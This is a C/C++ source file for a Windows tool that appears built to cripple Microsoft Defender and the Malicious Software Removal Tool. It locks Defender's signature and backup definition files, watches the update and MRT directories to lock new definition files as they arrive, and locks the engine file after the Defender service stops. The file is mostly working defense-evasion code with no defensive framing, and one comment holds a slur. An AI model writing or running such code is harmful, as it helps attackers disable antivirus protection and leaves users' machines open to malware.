#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ntstatus.h>
#include <conio.h>
#include <objbase.h>
#pragma comment(lib,"ntdll.lib")

HANDLE* gHandleTracker = NULL;
CRITICAL_SECTION* gHandleTrackerLock;

wchar_t gbackupfile1[MAX_PATH] = { 0 };
wchar_t gbackupfile2[MAX_PATH] = { 0 };

struct UpdThreadObj {

	wchar_t* wdupdatedir;
	wchar_t* target;

};

void AddHandle(HANDLE hlock)
{
	// shit code but works i guess
	static unsigned int handlecount = 0;
	EnterCriticalSection(gHandleTrackerLock);
	HANDLE* ntracker = (HANDLE*)malloc((++handlecount + 1) * sizeof(HANDLE));
	if (gHandleTracker)
	{
		memmove(ntracker, gHandleTracker, handlecount * sizeof(HANDLE));
	} 
	ntracker[handlecount - 1] = hlock;
	ntracker[handlecount] = NULL;
	if (gHandleTracker)
		free(gHandleTracker);
	gHandleTracker = ntracker;
	LeaveCriticalSection(gHandleTrackerLock);
}

void TryLockBackup() {

	static HANDLE hlock1 = NULL;
	static HANDLE hlock2 = NULL;
	if (hlock1 && hlock2)
		return;
	UNICODE_STRING unistr = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	RtlInitUnicodeString(&unistr, gbackupfile1);
	InitializeObjectAttributes(&objattr, &unistr, OBJ_CASE_INSENSITIVE, NULL, NULL);
	IO_STATUS_BLOCK iostat = { 0 };

	NTSTATUS ntstat = STATUS_SUCCESS;
	if (!hlock1)
		ntstat = NtCreateFile(&hlock1, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);

	RtlInitUnicodeString(&unistr, gbackupfile2);
	if (!hlock2)
		ntstat = NtCreateFile(&hlock2, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
	LARGE_INTEGER li2 = { 0 };
	if (hlock1) {
		LARGE_INTEGER li = { 0 };
		GetFileSizeEx(hlock1, &li);
		OVERLAPPED ov = { 0 };
		LockFileEx(hlock1, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
		printf("File \"%ws\" was locked.\n", &gbackupfile2[4]);
		AddHandle(hlock1);
	}
	if (hlock2)
	{
		LARGE_INTEGER li = { 0 };
		GetFileSizeEx(hlock2, &li);
		OVERLAPPED ov = { 0 };
		LockFileEx(hlock2, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
		printf("File \"%ws\" was locked.\n", &gbackupfile2[4]);
		AddHandle(hlock2);

	}
	return;
}


DWORD WINAPI UpdateBlockerThread(UpdThreadObj* argv)
{
	wchar_t fpath[MAX_PATH] = { 0 };
	wchar_t _fpath[MAX_PATH] = { 0 };
	wcscpy(fpath, argv->wdupdatedir);
	wcscat(fpath, L"\\");
	wcscat(fpath, argv->target);
	free(argv->target);
	delete argv;
	DWORD index = 0;

	HANDLE hlock = NULL;
	UNICODE_STRING target = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	CLSID tmp = { 0 };
	NTSTATUS stat = STATUS_SUCCESS;
	IO_STATUS_BLOCK iostat = { 0 };
	wchar_t mx[40] = { 0 };
	/*
	for (int i = wcslen(fpath); i > 0; i--) {

		if (fpath[i] == L'\\')
		{
			if (wcslen(fpath) > 99)
			{
				memmove(mx, &fpath[i - 38], 38 * sizeof(wchar_t));
				break;
			}
			else if (wcslen(fpath) > 67)
			{
				memmove(mx, &fpath[i - 6], 6 * sizeof(wchar_t));
				break;
			}
			
			break;
		}
	}
	wchar_t __cmp[7] = { 0 };
	memmove(__cmp, mx, 6 * sizeof(wchar_t));*/
	if (1/*(!CLSIDFromString(mx, &tmp)) || _wcsicmp(__cmp, L"Backup") == 0*/)
	{
		printf("Found path : \"%ws\"\n", fpath);
		wcscpy(_fpath, L"\\??\\");
		wcscat(_fpath, fpath);
		RtlInitUnicodeString(&target, _fpath);
		InitializeObjectAttributes(&objattr, &target, OBJ_CASE_INSENSITIVE, NULL, NULL);
		IO_STATUS_BLOCK iostat = { 0 };

		do {
			stat = NtCreateFile(&hlock, GENERIC_READ | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, NULL);
			if (stat == STATUS_NOT_FOUND || stat == STATUS_OBJECT_NAME_NOT_FOUND || stat == STATUS_OBJECT_PATH_NOT_FOUND)
				return stat;
		} while (stat);
		LARGE_INTEGER li = { 0 };
		GetFileSizeEx(hlock, &li);
		LARGE_INTEGER offset = { 0,0 };

		if (!LockFile(hlock, offset.LowPart, offset.HighPart, li.LowPart, li.HighPart))
		{
			printf("LockFile failed, error : %d\n", GetLastError());
		}
		printf("File \"%ws\" was locked.\n", fpath);
		
		AddHandle(hlock);
	}
	
	return ERROR_SUCCESS;
}


VOID WDKillerCallback(IN PVOID pParameter)
{

	printf("Windows defender stopped...\n");
	PSERVICE_NOTIFY psny = (PSERVICE_NOTIFY)pParameter;
	SC_HANDLE hsvc = (SC_HANDLE)psny->pContext;
	DWORD requiredbytes = 0;
	QueryServiceConfig(hsvc, NULL, NULL, &requiredbytes);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		printf("Failed to query windows defender service configuration, error : %d\n", GetLastError());
		return;
	}
	LPQUERY_SERVICE_CONFIG svccfg = (LPQUERY_SERVICE_CONFIG)malloc(requiredbytes);
	if (!QueryServiceConfig(hsvc, svccfg, requiredbytes, &requiredbytes))
	{
		printf("Failed to query windows defender service configuration, error : %d\n", GetLastError());
		return;
	}
	svccfg->lpBinaryPathName[wcslen(svccfg->lpBinaryPathName) - 1] = NULL;
	wchar_t* binpath = &svccfg->lpBinaryPathName[1];
	/*
	wchar_t dllpath[MAX_PATH] = { 0 };
	memmove(dllpath, binpath, wcslen(binpath) * sizeof(wchar_t) - (11 * sizeof(wchar_t)));
	wcscat(dllpath, L"MpSvc.dll");
	printf("%ws\n", dllpath);
	*/


	HKEY wdkey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates", NULL, KEY_READ, &wdkey) || !wdkey)
	{
		printf("Failed to open windows defender key.\n");
		return;
	}
	wchar_t sigpath[MAX_PATH] = { 0 };
	DWORD retsz = sizeof(sigpath);
	//TODO : Check if this returns a properly null terminated string
	DWORD retcode = RegQueryValueEx(wdkey, L"SignatureLocation", NULL, NULL, (LPBYTE)sigpath, &retsz);
	RegCloseKey(wdkey);
	wdkey = NULL;
	if (retcode)
	{
		printf("Failed to find windows defender signature path.\n");
		return;
	}

	wcscat(sigpath, L"\\mpavbase.vdm");
	wchar_t _sigpath[MAX_PATH] = { 0 };
	wcscpy(_sigpath, L"\\??\\");
	wcscat(_sigpath, sigpath);
	UNICODE_STRING unistr = { 0 };
	RtlInitUnicodeString(&unistr, _sigpath);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &unistr, OBJ_CASE_INSENSITIVE, NULL, NULL);
	IO_STATUS_BLOCK iostat = { 0 };
	// if you are reading this, you are autistic.
	HANDLE hlock = NULL;
	NTSTATUS ntstat = STATUS_SUCCESS;
	ntstat = NtCreateFile(&hlock, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
	if (ntstat)
	{
		printf("Failed to open engine file \"%ws\", error : 0x%0.8X\n", unistr.Buffer, ntstat);
		return;
	}
	LARGE_INTEGER li = { 0 };
	LARGE_INTEGER li2 = { 0 };
	GetFileSizeEx(hlock, &li);
	OVERLAPPED ov = { 0 };
	LockFileEx(hlock, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);

	printf("File locked.\n");
	free(svccfg);
	AddHandle(hlock);
	return;
}


DWORD WINAPI WDKillerThread(void*)
{
	SC_HANDLE hsvc = NULL;
	SC_HANDLE scmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (!scmgr)
	{
		printf("Failed to open service manager, error : %d\n", GetLastError());
		return 1;
	}
	hsvc = OpenService(scmgr, L"WinDefend", SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
	CloseServiceHandle(scmgr);
	if (!hsvc)
	{
		printf("Failed to open WinDefend service, error : %d\n", GetLastError());
		return 1;
	}

	SERVICE_STATUS svcstat = { 0 };
	if (!QueryServiceStatus(hsvc, &svcstat) || svcstat.dwCurrentState != SERVICE_RUNNING)
	{
		printf("Windows Defender isn't running, exiting...");
		CloseHandle(hsvc);
		ExitProcess(ERROR_SUCCESS);
	}
	while (1) {
		SERVICE_NOTIFY_2W svcnotify = { 0 };
		svcnotify.dwVersion = SERVICE_NOTIFY_STATUS_CHANGE;
		svcnotify.pfnNotifyCallback = WDKillerCallback;
		svcnotify.pContext = hsvc;
		if (NotifyServiceStatusChangeW(hsvc,
			SERVICE_NOTIFY_STOPPED, &svcnotify))
		{
			printf("Failed to set a notification for windows defender status.\n");
			CloseHandle(hsvc);
			return 1;
		}
		printf("Registered callback for Windows Defender status change.\n");
		SleepEx(INFINITE, TRUE);
	}
	CloseHandle(hsvc);
	return 0;

}

DWORD WINAPI MRTWorkerThread(void*) {

	wchar_t wdpath[MAX_PATH] = { 0 };
	wchar_t _wdupdatedir[] = { L"\\??\\C:\\Windows\\System32\\MRT"};
	UNICODE_STRING target = { 0 };
	RtlInitUnicodeString(&target, _wdupdatedir);
	OBJECT_ATTRIBUTES objattr = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hmonitordir = NULL;
	DWORD retbytes = 0;

	InitializeObjectAttributes(&objattr, &target, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS stat = STATUS_SUCCESS; 
	do {
		Sleep(10);
		stat = NtCreateFile(&hmonitordir, FILE_READ_DATA | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT, NULL, NULL);

	} while (stat == STATUS_OBJECT_NAME_NOT_FOUND);
	if (stat || !hmonitordir)
	{
		printf("Failed to open MRT directory, error : 0x%0.8X\n",stat);
		return 1;
	}
	char notifydata[0x1000] = { 0 };
	do {

		if (!ReadDirectoryChangesW(hmonitordir, notifydata, sizeof(notifydata), TRUE, FILE_NOTIFY_CHANGE_SIZE, &retbytes, NULL, NULL))
		{

			printf("Failed to set directory watcher.\n");
			return 1;
		}


		FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)notifydata;
		if (fni->Action != FILE_ACTION_MODIFIED)
			continue;

		//printf("Notify triggered.\n");

		UpdThreadObj* threadargv = new UpdThreadObj;
		threadargv->wdupdatedir = &_wdupdatedir[4];
		fni->FileName[fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)] = NULL;
		wchar_t* target = (wchar_t*)malloc(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t));
		ZeroMemory(target, sizeof(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)));
		wcscpy(target, fni->FileName);
		threadargv->target = target;
		DWORD tid = 0;
		// TODO : track thread creation
		HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)UpdateBlockerThread, threadargv, NULL, &tid);

	} while (1);
	return ERROR_SUCCESS;
}

int wmain()
{
	DWORD tid2 = 0;


	wchar_t updatedir[MAX_PATH] = { 0 };
	HKEY wdkey = NULL;
	wchar_t wdpath[MAX_PATH] = { 0 };
	wchar_t wdupdatedir[MAX_PATH] = { 0 };
	wchar_t _wdupdatedir[MAX_PATH] = { 0 };
	DWORD retsz = sizeof(wdpath);
	DWORD retbytes = 0;
	DWORD retcode = 0;
	HANDLE hmonitordir = NULL;
	NTSTATUS stat = STATUS_SUCCESS;
	UNICODE_STRING target = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	gHandleTrackerLock = new CRITICAL_SECTION;
	InitializeCriticalSection(gHandleTrackerLock);


	HANDLE wdkiller = NULL;



	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", NULL, KEY_READ, &wdkey) || !wdkey)
	{
		printf("Failed to open windows defender key.\n");
		return 1;
	}

	//TODO : Check if this returns a properly null terminated string
	retcode = RegQueryValueEx(wdkey, L"ProductAppDataPath", NULL, NULL, (LPBYTE)wdpath, &retsz);
	RegCloseKey(wdkey);
	wdkey = NULL;
	if (retcode)
	{
		printf("Failed to find windows defender installation path.\n");
		return 1;
	}

	wcscpy(wdupdatedir, wdpath);
	wcscat(wdupdatedir, L"\\Definition Updates");

	wcscpy(_wdupdatedir, L"\\??\\");
	wcscat(_wdupdatedir, wdupdatedir);

	wcscpy(gbackupfile1, _wdupdatedir);
	wcscpy(gbackupfile2, _wdupdatedir);
	wcscat(gbackupfile1, L"\\Backup\\mpavbase.lkg");
	wcscat(gbackupfile2, L"\\Backup\\mpavbase.vdm");

	TryLockBackup();

	wdkiller = CreateThread(NULL, NULL, WDKillerThread, NULL, NULL, &tid2);

	// run in killer mode
	// WaitForSingleObject(wdkiller,INFINITE);
	// 

	HANDLE mrtkiller = CreateThread(NULL, NULL, MRTWorkerThread, NULL, NULL, &tid2);
	if (!wdkiller)
	{
		printf("Failed to create defender killer thread.\n");
	}
	if (!mrtkiller)
	{
		printf("Failed to create MRT killer thread.\n");
	}

	RtlInitUnicodeString(&target, _wdupdatedir);
	InitializeObjectAttributes(&objattr, &target, OBJ_CASE_INSENSITIVE, NULL, NULL);

	stat = NtCreateFile(&hmonitordir, FILE_READ_DATA | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT, NULL, NULL);
	if (stat || !hmonitordir)
	{
		printf("Failed to open windows defender update directory.\n");
		return 1;
	}

	

	//WaitForSingleObject(gevent, INFINITE);
	char notifydata[0x1000] = { 0 };
	do {

		if (!ReadDirectoryChangesW(hmonitordir, notifydata, sizeof(notifydata), TRUE, FILE_NOTIFY_CHANGE_SIZE, &retbytes, NULL, NULL))
		{

			printf("Failed to set directory watcher.\n");
			return 1;
		}


		FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)notifydata;
		if (fni->Action != FILE_ACTION_MODIFIED)
			continue;

		//printf("Notify triggered.\n");
		
		UpdThreadObj* threadargv = new UpdThreadObj;
		threadargv->wdupdatedir = wdupdatedir;
		fni->FileName[fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)] = NULL;
		wchar_t* target = (wchar_t*)malloc(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t));
		ZeroMemory(target, sizeof(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)));
		wcscpy(target, fni->FileName);
		threadargv->target = target;
		DWORD tid = 0;
		// TODO : track thread creation
		HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)UpdateBlockerThread, threadargv, NULL, &tid);


	} while (1);


	CloseHandle(hmonitordir);


	return 0;
}